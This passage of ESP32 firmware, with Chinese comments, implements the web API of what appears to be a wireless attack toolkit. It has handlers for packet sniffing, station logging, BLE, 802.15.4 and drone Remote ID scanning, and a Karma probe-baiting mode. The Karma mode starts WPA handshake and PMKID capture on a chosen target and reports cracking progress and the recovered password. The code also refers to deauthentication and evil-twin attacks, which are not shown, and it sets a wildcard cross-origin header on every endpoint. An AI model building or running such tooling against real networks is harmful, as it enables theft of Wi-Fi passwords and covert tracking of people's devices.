        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-14, 5G 用 36-165\"}");
#else
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-14\"}");
#endif
        return;
      }
      sSniffer.channel = (uint8_t)ch;
    }
    String hopStr = extractJson(body, "hopping");
    sSniffer.hopping = (hopStr == "true" || hopStr == "1");
    String dfsStr = extractJson(body, "skipDfs");
    if (dfsStr.length()) sSniffer.skipDfs = (dfsStr != "false" && dfsStr != "0");
    // 跳频模式: band 决定起点频段 (未指定时沿用当前信道所在频段)
    if (sSniffer.hopping) {
      sSniffer.channel = hopStartChannel(band, sSniffer.channel);
      // 显式指定频段时立即对齐起点, 避免「状态已切 5G、空口还在 2.4G」的短暂不一致
      if (band && !sHandshake.capturing) applyApChannel(sSniffer.channel);
    }
  }
  if (!sSniffer.hopping && !sHandshake.capturing) applyApChannel(sSniffer.channel);
  sSniffer.running = true;
  sSniffer.lastFpsCalc = millis();
  sSniffer.lastHopTime = millis();
  sSniffer.fpsAccum = 0;
  sSniffer.fps = 0;
  if (!syncPromiscuousEngine()) {
    sSniffer.running = false;
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
    return;
  }
  log("[sniffer] 数据包分析器已启动! 信道=" + String(sSniffer.channel) +
      (isBand5G(sSniffer.channel) ? " (5G)" : " (2.4G)") +
      (sSniffer.hopping ? (sSniffer.skipDfs ? " (跳频, 跳过 DFS)" : " (跳频)") : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":true}");
}

static void handleSnifferStop() {
  sSniffer.running = false;
  syncPromiscuousEngine();
  if (!sHandshake.capturing && !sDeauth.running && !sEvilTwin.active) applyApChannel(apChannel);
  log("[sniffer] 数据包分析器已停止, 累计捕获 " + String(sSniffer.totalPackets) + " 帧");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
}

static void handleSnifferStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(1024);
  json = "{\"running\":" + String(sSniffer.running ? "true" : "false") + ",";
  json += "\"channel\":" + String(sSniffer.channel) + ",";
  json += "\"band\":" + String(isBand5G(sSniffer.channel) ? 5 : 2) + ",";
  json += "\"hopping\":" + String(sSniffer.hopping ? "true" : "false") + ",";
  json += "\"skipDfs\":" + String(sSniffer.skipDfs ? "true" : "false") + ",";
  json += "\"total\":" + String(sSniffer.totalPackets) + ",";
  json += "\"mgmt\":" + String(sSniffer.mgmtCount) + ",";
  json += "\"ctrl\":" + String(sSniffer.ctrlCount) + ",";
  json += "\"data\":" + String(sSniffer.dataCount) + ",";
  json += "\"fps\":" + String(sSniffer.fps) + ",";
  json += "\"packets\":[";
  for (int i = 0; i < sSniffer.packetCount; i++) {
    int idx = (sSniffer.packetHead + 16 - sSniffer.packetCount + i) % 16;
    if (i) json += ",";
    json += "{\"ts\":" + String(sSniffer.packets[idx].ts) + ",";
    json += "\"ch\":" + String(sSniffer.packets[idx].ch) + ",";
    json += "\"rssi\":" + String(sSniffer.packets[idx].rssi) + ",";
    json += "\"type\":\"" + jsonEscape(sSniffer.packets[idx].type) + "\",";
    json += "\"src\":\"" + jsonEscape(sSniffer.packets[idx].src) + "\",";
    json += "\"dst\":\"" + jsonEscape(sSniffer.packets[idx].dst) + "\",";
    json += "\"info\":\"" + jsonEscape(sSniffer.packets[idx].info) + "\"}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

/* ---------------- Airodump API ---------------- */
static void handleAirodumpStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    uint8_t band = parseBandArg(extractJson(body, "band"));
#if !SOC_WIFI_SUPPORT_5G
    if (band == 5) {
      server.sendHeader("Access-Control-Allow-Origin", "*");
      server.send(400, "application/json", "{\"ok\":false,\"error\":\"本芯片仅支持 2.4GHz\"}");
      return;
    }
#endif
    String hopStr = extractJson(body, "hopping");
    sAirodump.hopping = (hopStr != "false" && hopStr != "0");
    String chStr = extractJson(body, "channel");
    if (chStr.length()) {
      int ch = chStr.toInt();
      if (!isValidSniffChannel(ch)) {
        server.sendHeader("Access-Control-Allow-Origin", "*");
#if SOC_WIFI_SUPPORT_5G
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-14, 5G 用 36-165\"}");
#else
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-14\"}");
#endif
        return;
      }
      sAirodump.currentChannel = (uint8_t)ch;
    }
    String dfsStr = extractJson(body, "skipDfs");
    if (dfsStr.length()) sAirodump.skipDfs = (dfsStr != "false" && dfsStr != "0");
    // 跳频模式: band 决定起点频段 (未指定时沿用当前信道所在频段)
    if (sAirodump.hopping) {
      sAirodump.currentChannel = hopStartChannel(band, sAirodump.currentChannel);
      // 显式指定频段时立即对齐起点, 避免「状态已切 5G、空口还在 2.4G」的短暂不一致
      if (band && !sHandshake.capturing) applyApChannel(sAirodump.currentChannel);
    }
  }
  sAirodump.stationCount = 0;
  if (!sAirodump.hopping && !sHandshake.capturing) applyApChannel(sAirodump.currentChannel);
  sAirodump.running = true;
  sAirodump.lastHopTime = millis();
  if (!syncPromiscuousEngine()) {
    sAirodump.running = false;
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
    return;
  }
  log("[airodump] Airodump侦察已启动! 初始信道=" + String(sAirodump.currentChannel) +
      (isBand5G(sAirodump.currentChannel) ? " (5G)" : " (2.4G)") +
      (sAirodump.hopping ? (sAirodump.skipDfs ? " (自动跳频, 跳过 DFS)" : " (自动跳频)") : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":true}");
}

static void handleAirodumpStop() {
  sAirodump.running = false;
  syncPromiscuousEngine();
  if (!sHandshake.capturing && !sDeauth.running && !sEvilTwin.active) applyApChannel(apChannel);
  log("[airodump] Airodump侦察已停止, 记录 " + String(sAirodump.stationCount) + " 个对端");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
}

static void handleAirodumpStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(2048);
  json = "{\"running\":" + String(sAirodump.running ? "true" : "false") + ",";
  json += "\"channel\":" + String(sAirodump.currentChannel) + ",";
  json += "\"band\":" + String(isBand5G(sAirodump.currentChannel) ? 5 : 2) + ",";
  json += "\"hopping\":" + String(sAirodump.hopping ? "true" : "false") + ",";
  json += "\"skipDfs\":" + String(sAirodump.skipDfs ? "true" : "false") + ",";
  json += "\"stations\":[";
  for (int i = 0; i < sAirodump.stationCount; i++) {
    if (i) json += ",";
    json += "{\"mac\":\"" + jsonEscape(sAirodump.stations[i].mac) + "\",";
    json += "\"bssid\":\"" + jsonEscape(sAirodump.stations[i].bssid) + "\",";
    json += "\"rssi\":" + String(sAirodump.stations[i].rssi) + ",";
    json += "\"packets\":" + String(sAirodump.stations[i].packets) + ",";
    json += "\"probes\":\"" + jsonEscape(sAirodump.stations[i].probes) + "\"}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

/* ---------------- BLE 扫描 API (P2) ----------------
 * 路由在所有芯片上都注册 (路由表不分叉), 无 BLE 硬件的芯片 (ESP32-S2) 返回 501。
 * 启停只翻 sBLE.want, 真正的协议栈初始化/拆除在 bleTaskFunc 里串行完成。
 */
static void bleUnsupported() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(501, "application/json",
              "{\"ok\":false,\"error\":\"本芯片不支持 BLE (无蓝牙硬件)\"}");
}

static void handleBleStart() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_BLE_SUPPORTED
  if (sBLE.want || sBLE.phase != BLE_IDLE) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"BLE 扫描已在运行\"}");
    return;
  }
  // 首次使用时才创建管理任务: 不用 BLE 的部署不额外占用任务栈
  static bool sBleTaskStarted = false;
  if (!sBleTaskStarted) {
    if (xTaskCreate(bleTaskFunc, "ble_task", BLE_TASK_STACK, nullptr, 1, nullptr) != pdPASS) {
      server.send(500, "application/json", "{\"ok\":false,\"error\":\"BLE 任务创建失败 (内存不足)\"}");
      return;
    }
    sBleTaskStarted = true;
  }
  uint16_t dur = 0;  // 0 = 持续 (10s 切片循环)
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    String durStr = extractJson(body, "duration");
    if (durStr.length()) {
      int v = durStr.toInt();
      if (v > 0) dur = (uint16_t)(v > 65535 ? 65535 : v);
    }
  }
  sBLE.durationSec = dur;
  sBLE.initFailed = false;
  sBLE.sliceDone = false;
  sBLE.want = true;  // bleTaskFunc 接管
  log("[ble] 收到扫描请求 (" +
      String(dur ? ("限时 " + String(dur) + "s") : String("持续")) +
      "), 等待协议栈就绪...");
  server.send(200, "application/json", "{\"ok\":true,\"status\":\"starting\"}");
#else
  bleUnsupported();
#endif
}

static void handleBleStop() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_BLE_SUPPORTED
  if (!sBLE.want && sBLE.phase == BLE_IDLE) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"BLE 扫描未在运行\"}");
    return;
  }
  sBLE.want = false;  // bleTaskFunc 会停扫并拆除协议栈
  server.send(200, "application/json", "{\"ok\":true,\"status\":\"stopping\"}");
#else
  bleUnsupported();
#endif
}

#if FW_BLE_SUPPORTED
// 定长字节数组 -> 大写十六进制 (out 至少 2*n+1 字节)
static void bleBytesHex(const uint8_t *p, uint8_t n, char *out) {
  static const char kHex[] = "0123456789ABCDEF";
  for (uint8_t i = 0; i < n; i++) {
    out[i * 2] = kHex[p[i] >> 4];
    out[i * 2 + 1] = kHex[p[i] & 0x0F];
  }
  out[n * 2] = '\0';
}

// /api/ble/status 与 /api/ble/devices 共用, 保证两个端点的字段契约一致
static void bleAppendDeviceJson(String &json, const BleDeviceEntry &e) {
  char mfgHex[17];
  bleBytesHex(e.mfg, e.mfgLen, mfgHex);
  char svcHex[17];
  bleBytesHex(e.svcData, e.svcDataLen, svcHex);
  json += "{\"mac\":\"" + jsonEscape(String(e.mac)) + "\"";
  json += ",\"name\":\"" + jsonEscape(String(e.name)) + "\"";
  json += ",\"rssi\":" + String(e.rssi);
  json += ",\"addrType\":" + String(e.addrType);
  json += ",\"advType\":\"" + String(bleAdvTypeStr(e.advType)) + "\"";
  json += ",\"companyId\":" + String(e.companyId);
  json += ",\"svcUuid\":" + String(e.svcUuid);
  json += ",\"svcData\":\"" + String(svcHex) + "\"";
  json += ",\"devClass\":" + String(e.devClass);
  json += ",\"randomMac\":" + String(e.randomMac ? "true" : "false");
  json += ",\"mfgHex\":\"" + String(mfgHex) + "\"";
  json += ",\"advCount\":" + String(e.advCount);
  json += ",\"lastSeen\":" + String(e.lastSeen);
  json += ",\"rid\":";
  if (e.ridFlags) {
    RidData d;
    memset(&d, 0, sizeof(d));
    d.flags = e.ridFlags;
    d.uaType = e.ridUaType;
    d.idType = e.ridIdType;
    memcpy(d.uasId, e.ridUasId, sizeof(d.uasId));
    d.lat = e.ridLat;   d.lon = e.ridLon;   d.alt = e.ridAlt;
    d.opLat = e.ridOpLat; d.opLon = e.ridOpLon; d.opAlt = e.ridOpAlt;
    json += "{";
    ridAppendFields(json, d);
    json += "}";
  } else {
    json += "null";
  }
  json += "}";
}
#endif

// P4-3: Remote ID 汇总 (BLE + WiFi Beacon), 最多 RID_MAX 条, 过期条目自动隐藏。
// 独立端点, 不挤占 /api/ble/* 与 /api/sniffer/* 的既有字段。
static void handleRid() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(64 + RID_MAX * 240);
  json = "[";
  bool first = true;
  const uint32_t now = millis();
  for (int i = 0; i < RID_MAX; i++) {
    RidEntry e;
    bool used;
    portENTER_CRITICAL(&sRidMux);
    used = sRid[i].used && (uint32_t)(now - sRid[i].lastSeen) <= RID_TTL_MS;
    if (used) e = sRid[i];
    portEXIT_CRITICAL(&sRidMux);
    if (!used) continue;
    if (!first) json += ",";
    first = false;
    json += "{\"mac\":\"" + jsonEscape(String(e.mac)) + "\"";
    json += ",\"transport\":\"" + String(e.transport == RID_TRANSPORT_BLE ? "ble" : "wifi") + "\",";
    ridAppendFields(json, e.d);
    json += ",\"rssi\":" + String(e.rssi);
    json += ",\"firstSeen\":" + String(e.firstSeen);
    json += ",\"lastSeen\":" + String(e.lastSeen);
    json += "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}

static void handleBleStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_BLE_SUPPORTED
  uint32_t totalAdv;
  uint16_t durationSec;
  uint32_t startedAt;
  uint8_t phase;
  bool initFailed, want;
  uint8_t snapshotCount;
  portENTER_CRITICAL(&sBLE.mux);
  totalAdv = sBLE.totalAdv;
  durationSec = sBLE.durationSec;
  startedAt = sBLE.scanStartedAt;
  phase = sBLE.phase;
  initFailed = sBLE.initFailed;
  want = sBLE.want;
  snapshotCount = sBLE.deviceCount;
  portEXIT_CRITICAL(&sBLE.mux);

  String json;
  // 按实际设备数预留, 避免大面积连续堆分配 + 多次扩容
  json.reserve(320 + (size_t)snapshotCount * 260);
  json = "{\"supported\":true,";
  json += "\"running\":" + String(phase == BLE_RUNNING && want ? "true" : "false") + ",";
  json += "\"phase\":\"";
  switch (phase) {
    case BLE_STARTING: json += "starting"; break;
    case BLE_RUNNING:  json += "running"; break;
    case BLE_STOPPING: json += "stopping"; break;
    default:           json += "idle"; break;
  }
  json += "\",";
  json += "\"initFailed\":" + String(initFailed ? "true" : "false") + ",";
  json += "\"continuous\":" + String(durationSec == 0 ? "true" : "false") + ",";
  json += "\"durationSec\":" + String(durationSec) + ",";
  json += "\"totalAdv\":" + String(totalAdv) + ",";
  json += "\"uptime\":" + String(phase == BLE_RUNNING ? (millis() - startedAt) / 1000 : 0) + ",";
  json += "\"devices\":[";

  // 逐条拷出 (临界区内只做定长 memory copy, 不在临界区里拼 String)
  bool first = true;
  uint8_t count = 0;
  for (int i = 0; i < BLE_MAX_DEVICES; i++) {
    BleDeviceEntry e;
    bool used;
    portENTER_CRITICAL(&sBLE.mux);
    used = sBLE.devices[i].used;
    if (used) e = sBLE.devices[i];
    portEXIT_CRITICAL(&sBLE.mux);
    if (!used) continue;
    count++;
    if (!first) json += ",";
    first = false;
    bleAppendDeviceJson(json, e);
  }
  json += "],\"deviceCount\":" + String(count) + "}";
  server.send(200, "application/json", json);
#else
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"supported\":false,\"running\":false,\"devices\":[],\"deviceCount\":0}");
#endif
}

static void handleBleDevices() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_BLE_SUPPORTED
  String json;
  json.reserve(64 + (size_t)sBLE.deviceCount * 260);
  json = "[";
  bool first = true;
  for (int i = 0; i < BLE_MAX_DEVICES; i++) {
    BleDeviceEntry e;
    bool used;
    portENTER_CRITICAL(&sBLE.mux);
    used = sBLE.devices[i].used;
    if (used) e = sBLE.devices[i];
    portEXIT_CRITICAL(&sBLE.mux);
    if (!used) continue;
    if (!first) json += ",";
    first = false;
    bleAppendDeviceJson(json, e);
  }
  json += "]";
  server.send(200, "application/json", json);
#else
  server.send(200, "application/json", "[]");
#endif
}

static void handleBleClear() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_BLE_SUPPORTED
  portENTER_CRITICAL(&sBLE.mux);
  for (int i = 0; i < BLE_MAX_DEVICES; i++) sBLE.devices[i].used = false;
  sBLE.deviceCount = 0;
  sBLE.totalAdv = 0;
  portEXIT_CRITICAL(&sBLE.mux);
  log("[ble] 设备列表已清空 (扫描状态不变)");
  server.send(200, "application/json", "{\"ok\":true}");
#else
  bleUnsupported();
#endif
}

/* ---------------- 802.15.4 API (P3) ----------------
 * 路由在所有芯片上注册 (路由表不分叉), 无 802.15.4 硬件的芯片返回 501。
 * 启停只翻 sI154.want, 协议栈的 enable/disable 由 i154TaskFunc 串行完成。
 */
#if !FW_IEEE802154_SUPPORTED
static void i154Unsupported() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(501, "application/json",
              "{\"ok\":false,\"error\":\"本芯片不支持 802.15.4 (无该射频)\"}");
}
#endif

#if FW_IEEE802154_SUPPORTED
static void i154AddrStr(const I154DevEntry &e, char *out, size_t n) {
  if (e.addrLen == 2) {
    snprintf(out, n, "0x%02X%02X", e.addr[1], e.addr[0]);
    return;
  }
  static const char *hex = "0123456789ABCDEF";
  size_t p = 0;
  for (int i = 7; i >= 0 && p + 3 <= n; i--) {
    out[p++] = hex[(e.addr[i] >> 4) & 0xF];
    out[p++] = hex[e.addr[i] & 0xF];
    if (i) out[p++] = ':';
  }
  out[p < n ? p : n - 1] = '\0';
}

static void i154AppendPans(String &json) {
  json += "[";
  bool first = true;
  for (int i = 0; i < I154_PAN_MAX; i++) {
    I154PanEntry e;
    bool used;
    portENTER_CRITICAL(&sI154.mux);
    used = sI154.pans[i].used;
    if (used) e = sI154.pans[i];
    portEXIT_CRITICAL(&sI154.mux);
    if (!used) continue;
    if (!first) json += ",";
    first = false;
    char buf[8];
    snprintf(buf, sizeof(buf), "0x%04X", e.panId);
    json += "{\"panId\":\"" + String(buf) + "\"";
    json += ",\"channel\":" + String(e.ch);
    json += ",\"frames\":" + String(e.frames);
    json += ",\"rssi\":" + String(e.rssi);
    json += ",\"lastSeen\":" + String(e.lastSeen) + "}";
  }
  json += "]";
}

static void i154AppendDevs(String &json) {
  json += "[";
  bool first = true;
  for (int i = 0; i < I154_DEV_MAX; i++) {
    I154DevEntry e;
    bool used;
    portENTER_CRITICAL(&sI154.mux);
    used = sI154.devs[i].used;
    if (used) e = sI154.devs[i];
    portEXIT_CRITICAL(&sI154.mux);
    if (!used) continue;
    if (!first) json += ",";
    first = false;
    char addr[24];
    i154AddrStr(e, addr, sizeof(addr));
    char pan[8];
    snprintf(pan, sizeof(pan), "0x%04X", e.panId);
    json += "{\"addr\":\"" + String(addr) + "\"";
    json += ",\"short\":" + String(e.addrLen == 2 ? "true" : "false");
    json += ",\"panId\":\"" + String(pan) + "\"";
    json += ",\"channel\":" + String(e.ch);
    json += ",\"frames\":" + String(e.frames);
    json += ",\"rssi\":" + String(e.rssi);
    json += ",\"lqi\":" + String(e.lqi);
    json += ",\"type\":\"" + String(i154TypeStr(e.lastType)) + "\"";
    json += ",\"lastSeen\":" + String(e.lastSeen) + "}";
  }
  json += "]";
}
#endif /* FW_IEEE802154_SUPPORTED */

static void handleI154Start() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_IEEE802154_SUPPORTED
  if (sI154.want || sI154.phase != I154_IDLE) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"802.15.4 扫描已在运行\"}");
    return;
  }
  // 首次使用时才创建管理任务: 不用该模块的部署不额外占用任务栈
  static bool sI154TaskStarted = false;
  if (!sI154TaskStarted) {
    if (xTaskCreate(i154TaskFunc, "i154_task", I154_TASK_STACK, nullptr, 1, nullptr) != pdPASS) {
      server.send(500, "application/json", "{\"ok\":false,\"error\":\"802.15.4 任务创建失败 (内存不足)\"}");
      return;
    }
    sI154TaskStarted = true;
  }
  uint8_t mode = I154_MODE_FRAMES;
  uint8_t ch = 15;
  bool hopping = true;
  uint16_t dur = 0;
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    String m = extractJson(body, "mode");
    if (m == "energy") mode = I154_MODE_ENERGY;
    String chStr = extractJson(body, "channel");
    if (chStr.length()) {
      int v = chStr.toInt();
      if (v == 0) {
        hopping = true;
      } else if (v >= I154_CH_MIN && v <= I154_CH_MAX) {
        hopping = false;
        ch = (uint8_t)v;
      } else {
        server.send(400, "application/json", "{\"ok\":false,\"error\":\"802.15.4 信道必须为 11-26 (0 = 跳频)\"}");
        return;
      }
    }
    String dStr = extractJson(body, "duration");
    if (dStr.length()) {
      int v = dStr.toInt();
      if (v > 0) dur = (uint16_t)(v > 65535 ? 65535 : v);
    }
  }
  if (mode == I154_MODE_ENERGY) hopping = true;  // 能量扫描总是扫全 11-26
  sI154.mode = mode;
  sI154.channel = ch;
  sI154.hopping = hopping;
  sI154.durationSec = dur;
  sI154.initFailed = false;
  sI154.autoPaused = false;   // 手动启动: 清除共存自动暂停标记 (由新的手动意图接管)
  sI154.want = true;  // i154TaskFunc 接管
  log("[i154] 收到扫描请求 (" + String(mode == I154_MODE_ENERGY ? "能量扫描" : "帧嗅探") + ", " +
      String(hopping ? String("跳频 11-26") : ("信道 " + String(ch))) + "), 等待射频就绪...");
  server.send(200, "application/json", "{\"ok\":true,\"status\":\"starting\"}");
#else
  i154Unsupported();
#endif
}

static void handleI154Stop() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_IEEE802154_SUPPORTED
  sI154.autoPaused = false;   // 手动停止: 清除共存自动暂停标记 (包括处于暂停窗口时)
  if (!sI154.want && sI154.phase == I154_IDLE) {
    server.send(409, "application/json", "{\"ok\":false,\"error\":\"802.15.4 扫描未在运行\"}");
    return;
  }
  sI154.want = false;
  server.send(200, "application/json", "{\"ok\":true,\"status\":\"stopping\"}");
#else
  i154Unsupported();
#endif
}

static void handleI154Status() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_IEEE802154_SUPPORTED
  uint8_t phase, mode, ch, panCount, devCount;
  bool want, hopping, initFailed;
  uint16_t durationSec;
  uint32_t startedAt, total, byType[5], chFrames[16];
  int8_t ed[16];
  portENTER_CRITICAL(&sI154.mux);
  phase = sI154.phase;
  want = sI154.want;
  hopping = sI154.hopping;
  mode = sI154.mode;
  ch = sI154.channel;
  durationSec = sI154.durationSec;
  initFailed = sI154.initFailed;
  startedAt = sI154.startedAt;
  total = sI154.total;
  panCount = sI154.panCount;
  devCount = sI154.devCount;
  for (int i = 0; i < 5; i++) byType[i] = sI154.byType[i];
  for (int i = 0; i < 16; i++) { chFrames[i] = sI154.chFrames[i]; ed[i] = sI154.ed[i]; }
  portEXIT_CRITICAL(&sI154.mux);

  String json;
  json.reserve(560 + (size_t)(panCount * 80 + devCount * 130));
  json = "{\"supported\":true,";
  json += "\"running\":" + String(phase == I154_RUNNING && want ? "true" : "false") + ",";
  json += "\"phase\":\"";
  switch (phase) {
    case I154_STARTING: json += "starting"; break;
    case I154_RUNNING:  json += "running"; break;
    case I154_STOPPING: json += "stopping"; break;
    default:           json += "idle"; break;
  }
  json += "\",";
  json += "\"mode\":\"" + String(mode == I154_MODE_ENERGY ? "energy" : "frames") + "\",";
  json += "\"channel\":" + String(ch) + ",";
  json += "\"hopping\":" + String(hopping ? "true" : "false") + ",";
  json += "\"durationSec\":" + String(durationSec) + ",";
  json += "\"initFailed\":" + String(initFailed ? "true" : "false") + ",";
  json += "\"uptime\":" + String(phase == I154_RUNNING ? (millis() - startedAt) / 1000 : 0) + ",";
  json += "\"apChannel\":" + String((int)apChannel) + ",";
  json += "\"apChannelActive\":" + String((int)apChannelActive) + ",";
  json += "\"total\":" + String(total) + ",";
  json += "\"byType\":{\"beacon\":" + String(byType[0]) + ",\"data\":" + String(byType[1]) +
          ",\"ack\":" + String(byType[2]) + ",\"cmd\":" + String(byType[3]) +
          ",\"other\":" + String(byType[4]) + "},";
  json += "\"chFrames\":[";
  for (int i = 0; i < 16; i++) json += (i ? "," : "") + String(chFrames[i]);
  json += "],\"ed\":[";
  for (int i = 0; i < 16; i++) json += (i ? "," : "") + String((int)ed[i]);
  json += "],";
  json += "\"panCount\":" + String(panCount) + ",\"deviceCount\":" + String(devCount) + ",";
  json += "\"pans\":";
  i154AppendPans(json);
  json += ",\"devices\":";
  i154AppendDevs(json);
  json += "}";
  server.send(200, "application/json", json);
#else
  server.send(200, "application/json",
              "{\"supported\":false,\"running\":false,\"pans\":[],\"devices\":[],\"panCount\":0,\"deviceCount\":0}");
#endif
}

static void handleI154Frames() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_IEEE802154_SUPPORTED
  String json;
  json.reserve(64 + (size_t)(sI154.panCount * 80 + sI154.devCount * 130));
  json = "{\"total\":" + String(sI154.total) + ",\"pans\":";
  i154AppendPans(json);
  json += ",\"devices\":";
  i154AppendDevs(json);
  json += "}";
  server.send(200, "application/json", json);
#else
  server.send(200, "application/json", "{\"total\":0,\"pans\":[],\"devices\":[]}");
#endif
}

static void handleI154Clear() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
#if FW_IEEE802154_SUPPORTED
  portENTER_CRITICAL(&sI154.mux);
  for (int i = 0; i < I154_PAN_MAX; i++) sI154.pans[i].used = false;
  for (int i = 0; i < I154_DEV_MAX; i++) sI154.devs[i].used = false;
  sI154.panCount = sI154.devCount = 0;
  sI154.total = 0;
  for (int i = 0; i < 5; i++) sI154.byType[i] = 0;
  for (int i = 0; i < 16; i++) sI154.chFrames[i] = 0;
  i154ResetEd();
  portEXIT_CRITICAL(&sI154.mux);
  log("[i154] 统计与列表已清空 (扫描状态不变)");
  server.send(200, "application/json", "{\"ok\":true}");
#else
  i154Unsupported();
#endif
}

/* ---------------- Karma API ---------------- */
static void handleKarmaStart() {
  sKarma.probesCaptured = 0;
  sKarma.probesBaited = 0;
  sKarma.probeCount = 0;
  sKarma.probeHead = 0;
  sKarma.running = true;   // 先置位, 使 promiscuous 过滤包含管理帧
  // 已选择目标时顺带启动 4-Way Handshake 捕获; 未选目标则只监听 Probe Request
  if (sTarget.set && sTarget.ssid.length()) {
    String err;
    if (!beginHandshakeCapture(err)) {
      log("[karma] 握手捕获未启动: " + err + " (仍继续监听 Probe Request)");
    }
  }
  if (!syncPromiscuousEngine()) {
    sKarma.running = false;
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(500, "application/json", "{\"ok\":false,\"error\":\"promiscuous 启动失败\"}");
    return;
  }
  log("[karma] Karma 探针诱捕已启动 (真实 promiscuous): 信道 " + String(apChannelActive) +
      (sHandshake.capturing ? ", 同时监听 4-Way Handshake" : ", 仅监听 Probe Request"));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"running\":true,\"channel\":" + String(apChannelActive) +
              ",\"handshake\":" + (sHandshake.capturing ? "true" : "false") + "}");
}

static void handleKarmaStop() {
  sKarma.running = false;
  stopCaptureEngine();      // 停止握手监听并恢复信道 (内部含 sync, 不会重复 send)
  sHandshake.cracking = false;
  emitLabState("handshake", false);
  log("[karma] Karma 探针诱捕已停止, 累计捕获 " + String(sKarma.probesCaptured) + " 个 Probe Request");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false}");
}

static void handleKarmaStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(1200);
  json = "{\"running\":" + String(sKarma.running ? "true" : "false") + ",";
  json += "\"capturing\":" + String(sHandshake.capturing ? "true" : "false") + ",";
  json += "\"m1\":" + String(sHandshake.m1 ? "true" : "false") + ",";
  json += "\"m2\":" + String(sHandshake.m2 ? "true" : "false") + ",";
  json += "\"m3\":" + String(sHandshake.m3 ? "true" : "false") + ",";
  json += "\"m4\":" + String(sHandshake.m4 ? "true" : "false") + ",";
  json += "\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") + ",";
  json += "\"captured\":" + String(sHandshake.captured ? "true" : "false") + ",";
  json += "\"keyver\":" + String(sHandshake.keyver) + ",";
  json += "\"cracking\":" + String(sHandshake.cracking ? "true" : "false") + ",";
  json += "\"progress\":" + String(sHandshake.crackProgress) + ",";
  json += "\"attempts\":" + String(sHandshake.crackAttempts) + ",";
  json += "\"total\":" + String(sHandshake.crackTotal) + ",";
  json += "\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\",";
  json += "\"probesCaptured\":" + String(sKarma.probesCaptured) + ",";
  json += "\"probesBaited\":" + String(sKarma.probesBaited) + ",";
  json += "\"probes\":[";
  for (int i = 0; i < sKarma.probeCount; i++) {
    int idx = (sKarma.probeHead + 10 - sKarma.probeCount + i) % 10;
    if (i) json += ",";
    json += "{\"mac\":\"" + jsonEscape(sKarma.probes[idx].mac) + "\",";
    json += "\"ssid\":\"" + jsonEscape(sKarma.probes[idx].ssid) + "\",";
    json += "\"rssi\":" + String(sKarma.probes[idx].rssi) + ",";
    json += "\"ts\":" + String(sKarma.probes[idx].ts) + ",";
    json += "\"baited\":" + String(sKarma.probes[idx].baited ? "true" : "false") + "}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

static void handleLog() {
  uint32_t since = 0;
  if (server.hasArg("since")) since = (uint32_t)atol(server.arg("since").c_str());
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(2048);
  json = "{\"entries\":[";
  int n = sizeof(sLogs) / sizeof(sLogs[0]);
  int cnt = 0;
  for (int i = n; i > 0; i--) {
    uint8_t idx = (sLogHead + n - i) % n;
    if (sLogs[idx].id == 0 || sLogs[idx].id <= since) continue;
    if (cnt) json += ",";
    json += "{\"id\":" + String(sLogs[idx].id) + ",\"line\":\"" +
            jsonEscape(String(sLogs[idx].line)) + "\"}";
    cnt++;
  }
  json += "]}";
  server.send(200, "application/json", json);
}

/* ---------------- 4. 系统配置与持久化 (NVS Preferences) ---------------- */
// 出厂初始口令: 每台设备首次上电用硬件 TRNG 随机生成并写入 NVS, 各设备互不相同。
